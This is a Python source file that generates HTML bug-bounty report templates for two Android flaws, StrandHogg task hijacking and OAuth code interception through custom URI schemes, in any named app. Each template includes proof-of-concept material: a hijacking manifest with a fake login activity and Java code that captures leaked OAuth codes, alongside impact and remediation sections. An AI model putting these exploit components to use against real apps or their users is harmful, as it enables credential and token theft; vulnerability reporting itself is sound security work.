def func_strandhog_report_template(program_name):
  strandhog_report_template = f"""
  <!DOCTYPE html>
  <html lang="en">
  <head>
	  <meta charset="UTF-8">
	  <meta name="viewport" content="width=device-width, initial-scale=1.0">
	  <title>Security Vulnerability Report</title>
	  <style>
		  body {{
			  font-family: Georgia, serif;
			  background-color: #f8f9fa;
			  display: flex;
			  justify-content: center;
			  align-items: center;
			  min-height: 100vh;
			  padding: 20px;
			  margin: 0;

		  }}
		  .container {{
			  margin: 0 auto;
			  max-width: 800px;
			  background: white;
			  border-radius: 12px;
			  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
			  padding: 30px;
			  text-align: left;
			  overflow-y: auto;
		  }}
		  h1 {{
			  font-size: 28px;
			  text-align: center;
			  color: #2c3e50;
			  margin-bottom: 15px;
		  }}
		  h2 {{
			  font-size: 22px;
			  color: #34495e;
			  border-bottom: 2px solid #ddd;
			  padding-bottom: 5px;
			  margin-bottom: 15px;
		  }}
		  h3 {{
			  font-size: 18px;
			  color: #2c3e50;
			  margin-top: 20px;
		  }}
		  p {{
			  font-size: 16px;
			  color: #555;
			  report-height: 1.6;
			  margin-bottom: 10px;
		  }}
		  .code-block {{
			  background: #f4f4f4;
			  padding: 10px;
			  border-left: 4px solid #2c3e50;
			  font-family: "Courier New", monospace;
			  font-size: 14px;
			  overflow-x: auto;
			  white-space: pre-wrap;
			  margin-bottom: 15px;
		  }}
		  .footer {{
			  text-align: center;
			  font-size: 14px;
			  color: #7f8c8d;
			  margin-top: 20px;
		  }}
	  </style>
  </head>
  <body>
	  <div class="container">
		  <h1>Security Vulnerability Report</h1>
		  <h2>StrandHogg Bug in {program_name} Android App</h2>
		  
		  <h3>Description</h3>
		  <p>The StrandHogg vulnerability allows a malicious application to pose as the legitimate {program_name} app and perform various unauthorized actions on behalf of the user. It exploits a flaw in Android's multitasking system, enabling attackers to hijack user sessions and gain access to sensitive information.</p>
		  
		  <h3>Proof of Concept (PoC)</h3>
		  <h4>PoC video is attached for better understanding</h4>
		  <p>
			  1. Install a malicious app on the same device as the {program_name} app.<br>
			  2. Launch the malicious app, then open {program_name}. Clicking back triggers the vulnerability.<br>
			  3. The malicious app appears as the {program_name} app on the device screen.<br>
			  4. Interacting with the fake app allows attackers to steal credentials and data.<br>
		  </p>
		  
		  <h3>Building PoC APK</h3>
		  <p>Follow these steps to build the PoC APK:</p>
		  <div class="code-block">
  &lt;manifest<br>
	  android:compileSdkVersion="33"<br>
	  package="dev.lucasnlm.strandhogg"<br>
	  xmlns:android="http://schemas.android.com/apk/res/android"&gt;<br>
	  &lt;application<br>
		  android:theme="@style/AppTheme"<br>
		  android:label="@string/app_name"<br>
		  android:debuggable="true"&gt;<br>
		  &lt;activity<br>
			  android:name="ch.nexusinformatik.strandhogg.InoffensiveActivity"<br>
			  android:launchMode="singleInstance"&gt;<br>
		  &lt;/activity&gt;<br>
		  &lt;activity<br>
			  android:name="ch.nexusinformatik.strandhogg.FakeLoginActivity"<br>
			  android:exported="true"<br>
			  android:taskAffinity="com.example.android"&gt;<br>
		  &lt;/activity&gt;<br>
	  &lt;/application&gt;<br>
  &lt;/manifest&gt;
		  </div>
		  
		  <h3>Verifying the Exploit</h3>
		  <p>
			  1. Open the target app and send it to the background.<br>
			  2. Launch the exploit app.<br>
			  3. Resume the target app. If the exploit activity appears instead, the attack is successful.<br>
		  </p>
		  
		  <h3>Impact</h3>
		  <p>
			  - <strong>Credential Theft:</strong> Attackers can steal user login credentials.<br>
			  - <strong>Data Exposure:</strong> Personal and sensitive data can be compromised.<br>
			  - <strong>Financial Loss:</strong> Fraudulent transactions may be initiated.<br>
			  - <strong>Unauthorized Actions:</strong> Attackers can manipulate app functionalities.<br>
		  </p>
		  
		  <h3>Remediation</h3>
		  <p>To mitigate this vulnerability, consider implementing the following:</p>
		  <div class="code-block">Set launchMode to singleInstance</div>
		  <div class="code-block">Override onBackPressed()</div>
		  <div class="code-block">Set taskAffinity=""</div>
		  
		  <h3>Conclusion</h3>
		  <p>Addressing the StrandHogg vulnerability is critical to ensuring user security. Implementing the recommended mitigations will help prevent attackers from exploiting this issue.</p>
		  
		  <p class="footer">Best Regards,<br>Riley Quinn</p>
	  </div>
  </body>
  </html>

	  """
  return strandhog_report_template

def func_oauth_report_template(program_name):
  oauth_report_template = f"""
  <!DOCTYPE html>
  <html lang="en">
	<head>
	  <meta charset="UTF-8" />
	  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
	  <title>OAuth Account Takeover Report</title>
	  <style>
		body {{
			  font-family: Georgia, serif;
			  background-color: #f8f9fa;
			  display: flex;
			  justify-content: center;
			  align-items: center;
			  min-height: 100vh;
			  padding: 20px;
			  margin: 0;
		}}

		header {{
		  color: white;
		  text-align: center;
		}}

		section {{
		  margin: auto;
		  background: white;
		  border-radius: 8px;
		  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
		  max-width: 800px;
		}}

		h1 {{
		  font-size: 28px;          
		  color: #2c3e50;
		  border-bottom: 3px solid #ddd;

		}}
		
		h2 {{
		  font-size: 22px;
		  color: #2c3e50;
		  border-bottom: 2px solid #ddd;

		}}
		
		h3 {{
		  font-size: 18px;
		  color: #2c3e50;

		}}

	  p {{
		  font-size: 16px;
		  color: #555;
		  line-height: 1.6;
		  margin-bottom: 10px;
	  }}
		code {{
		  display: block;
		  background: #f4f4f4;
		  border-left: 5px solid #2c3e50;
		  padding: 10px;
		  margin: 10px 0;
		  overflow-x: auto;
		  font-family: monospace;
		  white-space: pre-wrap; /* Preserve spaces and line breaks */
		}}

		a {{
		  color: #2c3e50;
		  text-decoration: none;
		}}

		a:hover {{
		  text-decoration: underline;
		}}

		ul {{
		  padding-left: 20px;
		}}

		ul li {{
		  margin-bottom: 10px;
		}}

		pre {{
		  white-space: pre-wrap;
		}}

		footer {{
		  text-align: center;
		  margin: 20px;
		  font-size: 0.9em;
		  color: #666;
		}}
	  </style>
	</head>

	<body>
	  <header>
		<h1>
		  OAuth Account Takeover Through Mobile App Impersonation in {program_name} APK
		</h1>
	  </header>

	  <section>
		<h2>Description</h2>
		<p>
		  Mobile app impersonation is a form of identity theft where malicious
		  actors create fraudulent mobile applications that mimic legitimate
		  OAuth-enabled apps. These malicious apps trick users into providing
		  their OAuth credentials, subsequently leading to unauthorized account
		  access. The attacker can then misuse the stolen access tokens to
		  impersonate the victim, leading to potential data breaches and
		  unauthorized actions on the victim's behalf.
		</p>
		<p>
		  One key assumption made during OAuth authentication flow is the
		  ownership of the entity that redirect_uri points to, in the case of
		  <b>redirect_uri=https://www.clientapp.com/callback/oauth</b>, we assume
		  <b>www.clientapp.com</b> belongs to the client app since they're the ones who
		  configured it as <b>redirect_uri</b> and they're the only ones who can claim
		  that domain.
		</p>
		<p>
		  In the case of mobile apps, the typical implementation for OAuth on
		  mobile relies on custom schemes like
		  <b>redirect_uri=com.target.app://oauth</b>, the problem here is that any
		  application on the user device can register this scheme and receive the
		  OAuth grant that was meant for the legitimate application.
		</p>
		<p>
		  In order for an application to register a custom URI scheme, it has to
		  declare it by adding an intent filter to its manifest similar to this
		  one:
		  <code>
	  &lt;activity android:exported&#x3D;&quot;true&quot; android:name&#x3D;&quot;PACKAGE_NAME.CLASS_NAME&quot;&gt;
		  &lt;intent-filter&gt; &lt;action android:name&#x3D;&quot;android.intent.action.VIEW&quot;&#x2F;&gt;
		  &lt;category android:name&#x3D;&quot;android.intent.category.DEFAULT&quot;&#x2F;&gt;
		  &lt;category android:name&#x3D;&quot;android.intent.category.BROWSABLE&quot;&#x2F;&gt;
		  &lt;data android:host&#x3D;&quot;oauth&quot; android:scheme&#x3D;&quot;com.target.app&quot;&#x2F;&gt;
	  &lt;&#x2F;intent-filter&gt; &lt;&#x2F;activity&gt;
		  </code>
		</p>
		<p>
		  It is possible for two apps to register the same scheme, in this case
		  the system can differentiate between the two apps using other attributes
		  such as host, port, path and mime type, in case where both apps have the
		  same attributes, the system will let the user decide which app to use to
		  continue
		</p>
	  </section>

	  <section>
		<h2>Steps to Reproduce</h2>
		<p><strong>PoC is attached for better understanding</strong><p>
		<h3>Finding Vulnerable Custom URI</h3>
		<ul>
		  <li><p>Decompile {program_name} APK.</p></li>
		  <li><p>Go to <em>AndroidManifest.xml</em>.</p></li>
		  <li><p>
			Search for intent filters receiving URIs containing sensitive data
			like tokens or codes.
		  </p></li>
		</ul>
		<h3>Making Exploit APK</h3>
		<ul>
		  <li><p>Create a new Android Studio Project.</p></li>
		  <li><p>Create an empty Activity.</p></li>
		  <li>
			<p>In <em>AndroidManifest.xml</em>, add the intent filter found in the
			{program_name} APK.
		  </p></li>
		  <li>
			<p>Add the following code to <em>MainActivity.java</em> to intercept the
			OAuth token:
		  </p></li>
		</ul>
		<code>
		  import android.content.ClipData;
		  import android.content.ClipboardManager;
		  import android.content.Intent;
		  import android.net.Uri;
		  import android.os.Bundle;
		  import android.view.View;
		  import android.widget.Button;
		  import android.widget.TextView;
		  import android.widget.Toast;
		  import androidx.appcompat.app.AppCompatActivity;
		  
		  /* loaded from: classes.dex */
		  public class MainActivity extends AppCompatActivity {{
			  /* JADX INFO: Access modifiers changed from: protected */
			  @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
			  public void onCreate(Bundle bundle) {{
				  Uri data;
				  super.onCreate(bundle);
				  setContentView(R.layout.activity_main);
				  TextView textView = (TextView) findViewById(R.id.titleTextView);
				  TextView textView2 = (TextView) findViewById(R.id.textView);
				  Button button = (Button) findViewById(R.id.copyButton);
				  button.setVisibility(8);
				  Intent intent = getIntent();
				  if (!"android.intent.action.VIEW".equals(intent.getAction()) || (data = intent.getData()) == null) {{
					  return;
				  }}
				  final String uri = data.toString();
				  textView.setText("OAuth Code Leaked Successfully");
				  textView2.setText(uri);
				  button.setVisibility(0);
				  button.setOnClickListener(new View.OnClickListener() {{ // from class: com.oauth.exploitfb1.MainActivity.1
					  @Override // android.view.View.OnClickListener
					  public void onClick(View view) {{
						  ((ClipboardManager) MainActivity.this.getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText("URL", uri));
						  Toast.makeText(MainActivity.this, "Data copied to clipboard", 0).show();
					  }}
				  }});
				  Toast.makeText(this, "Data received", 0).show();
			  }}
		  }}
	  </code>
		<ul>
		  <li><p>Build and sign the APK.</p></li>
		  <li><p>Install & Exploit.</p></li>
		</ul>
	  </section>

	  <section>
		<h2>Impact</h2>
		<ul>
		  <li><p><strong>Data Breaches:</strong> Access to sensitive data.</p></li>
		  <li>
			<p><strong>Identity Theft:</strong> Impersonation using stolen tokens.</p>
		  </li>
		  <li><p><strong>Financial Loss:</strong> Unauthorized transactions.</p></li>
		  <li>
			<p><strong>Reputation Damage:</strong> For both users and providers.</p>
		  </li>
		</ul>
	  </section>

	  <section>
		<h2>Recommendations</h2>
		<p>
		  In the context of OAuth, Custom schemes have been used traditionally,
		  but there are more secure and reliable options available, notably:
		</p>
		<ul>
		  <li><p>
			App to app integration like Google Identity Services and Facebook
			Express Login for Android:
			<strong
			  ><a
				href="https://developer.android.com/training/app-links/verify-android-applinks"
				>Link</a
			  ></strong
			></p>
		  </li>
		  <li><p>
			Use Android Verifiable App Links and iOS Associated Domains for secure OAuth flows:
			<ul>
			  <li>
			  <p>
				  Android Verifiable App Links and iOS Associated Domains are mechanisms implemented by Android and iOS operating systems, respectively, to enhance the security and user experience of mobile applications. Android Verifiable App Links ensure that when a user clicks a web link associated with an Android app, the system verifies its authenticity, making it less susceptible to phishing or malicious attacks. iOS Associated Domains, on the other hand, enable iOS apps to establish trusted connections with specific web domains, allowing for seamless integration between apps and web content, such as single sign-on and universal links. Both technologies serve to strengthen the trustworthiness of mobile app interactions and streamline user interactions, contributing to a safer and more convenient mobile ecosystem.
			  </p>
			  </li>
			</ul>
		  </p></li>
		</ul>
		<h3>How To Implement (Android Verifiable App Links)</h3>
		<p>
		  You need to have /.well-known/assetlinks.json hosted on your backend
		  with a format like this:
		</p>
		<strong>Sample assetlinks.json content</strong>
		<code>
	  [
		  {{
			"relation": [
			  "delegate_permission/common.handle_all_urls",
			  "delegate_permission/common.get_login_creds"
			],
			"target": {{
			  "namespace": "android_app",
			  "package_name": "com.myapplication.android",
			  "sha256_cert_fingerprints": [
				"APPLICATION_CERT_FINGERPRINT"
			  ]
			}}
		  }}
	  ]
	  </code>

		<strong>Sample AndroidManifest.xml Code</strong>
		<code>
		  &lt;intent-filter android:autoVerify&#x3D;&quot;true&quot;&gt;
			  &lt;action android:name&#x3D;&quot;android.intent.action.VIEW&quot; &#x2F;&gt;
			  &lt;category android:name&#x3D;&quot;android.intent.category.DEFAULT&quot; &#x2F;&gt;
			  &lt;category android:name&#x3D;&quot;android.intent.category.BROWSABLE&quot; &#x2F;&gt;

			  &lt;!-- If a user clicks on a shared link that uses the &quot;http&quot; scheme, your 
					app should be able to delegate that traffic to &quot;https&quot;. --&gt;
					
			  &lt;data android:scheme&#x3D;&quot;http&quot; &#x2F;&gt;
			  &lt;data android:scheme&#x3D;&quot;https&quot; &#x2F;&gt;

			  &lt;!-- Include one or more domains that should be verified. --&gt;
			  &lt;data android:host&#x3D;&quot;auth.myapp.com&quot; &#x2F;&gt;
		  &lt;&#x2F;intent-filter&gt;
		</code>

		<strong>Sample Kotlin Code</strong>
		<code>
		  Log.i(TAG, "Creating auth request for login hint: $loginHint")
		  val authRequestBuilder: AuthorizationRequest.Builder = Builder(
			  mAuthStateManager.getCurrent().getAuthorizationServiceConfiguration(),
			  mClientId.get(),
			  ResponseTypeValues.CODE,
			  "https://auth.myapp.com/oauth/handler" // The redirect URI with an https scheme
		  )
			  .setScope(mConfiguration.getScope())
		  if (!TextUtils.isEmpty(loginHint)) {{
			  authRequestBuilder.setLoginHint(loginHint)
		  }}
		  mAuthRequest.set(authRequestBuilder.build())
				</code>
	  </section>

	  <section>
		  <h2>Reference:</h2>
		  <ul>
			  <li>
				  https://developers.googleblog.com/2023/10/enhancing-oauth-app-impersonation-protections.html
			  </li>
			  <li>
				  https://developer.android.com/training/app-links/verify-android-applinks
			  </li>
			  <li>
				  https://blog.ostorlab.co/one-scheme-to-rule-them-all.html
			  </li>
		  </ul>
	  </section>

	  <footer>
	  <strong><p>Best Regards <br/> Riley Quinn ;)</p></strong>
	  </footer>
	</body>
  </html>
	  """
  return oauth_report_template


def get_report_template(VULN, program_name):
	if VULN == 'Strandhog':
		return func_strandhog_report_template(program_name)
	elif VULN == 'OAuth':
		return func_oauth_report_template(program_name)
	else:
   		return None